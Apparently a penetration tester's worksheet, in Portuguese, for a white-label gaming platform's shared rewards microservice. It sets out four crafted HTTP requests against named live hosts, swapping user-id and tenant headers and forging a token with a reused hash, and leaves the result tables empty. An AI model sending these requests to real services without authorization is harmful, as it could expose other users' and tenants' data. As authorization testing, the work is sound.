# Multi-tenant — comportamento legítimo (não é vulnerabilidade)

## Esclarecimento

Na sessão 2026-06-08, capturamos uma request automática que o próprio
site `ds.aphrodite777.com` dispara após o registro:

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 207587
Xutc: aphrodite777
```

Essa request foi **disparada pela aplicação**, não pelo testador.
Significa que:

- `hus3wyear.ccgamevip.com` é um **microserviço compartilhado** da
  plataforma white-label (provavelmente o serviço de "year reward",
  promoções anuais, calendário de eventos).
- O tenant emissor é identificado pelo header `Xutc`.
- O userId é redundantemente passado em `Nbcx` para roteamento.

**Isso é arquitetura legítima de multi-tenant.** Não é
vulnerabilidade por si só.

## O que ainda vale testar

A pergunta interessante NÃO é "será que o token funciona em outros
domínios?" (resposta: por design, sim, é um microserviço compartilhado).
A pergunta é "será que o microserviço valida CORRETAMENTE quem é o dono
do token, ou aceita manipulação?".

### Teste 1 — `Nbcx` swap (forçar leitura de outro user)

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 137028                  ← TROCAR
Xutc: aphrodite777
```

| `Nbcx` | Status | data.userId no body | Notas |
|--------|--------|----------------------|-------|
| 207587 (original) | 200 | 207587 | baseline |
| 137028 |        |                       |       |
| 1      |        |                       |       |
| 137027 |        |                       |       |

**Se `data.userId` mudar conforme `Nbcx`** = IDOR via header (severo).
**Se sempre voltar 207587** = backend ignora `Nbcx` e usa o token (ok).

### Teste 2 — `Nbcx` ausente

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Xutc: aphrodite777
[remover Nbcx]
```

Resposta esperada se backend é robusto: 200 com `userId:207587` (extrai
do token).
Resposta se backend depende do `Nbcx`: 400 ou 401.

### Teste 3 — `Xutc` swap (cross-tenant via microserviço)

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 207587
Xutc: amizade777              ← TROCAR
```

| `Xutc`          | Status | code | data |
|-----------------|--------|------|------|
| aphrodite777    | 200    | 200  | (referência) |
| amizade777      |        |      |      |
| lucky777        |        |      |      |
| rainha777slots  |        |      |      |
| megaslott       |        |      |      |

**Se `Xutc:amizade777` retornar 200 com dados do user 207587 do tenant
amizade777**, então o microserviço aceita roteamento entre tenants
controlado pelo header — atacante registrado em `aphrodite777` lê dados
de eventos de `amizade777`. Possível CRÍTICO se houver dados financeiros
no response.

### Teste 4 — Token forjado (userId trocado, hash mantido)

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 137028:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
                                ^^^ mantém o hash original
Nbcx: 137028
Xutc: aphrodite777
```

Se aceitar = hash do token não está sendo validado (CRÍTICO).
Esperado: 401 ou 403.

## Cole os resultados aqui

```
[teste 1]
```

```
[teste 2]
```

```
[teste 3]
```

```
[teste 4]
```
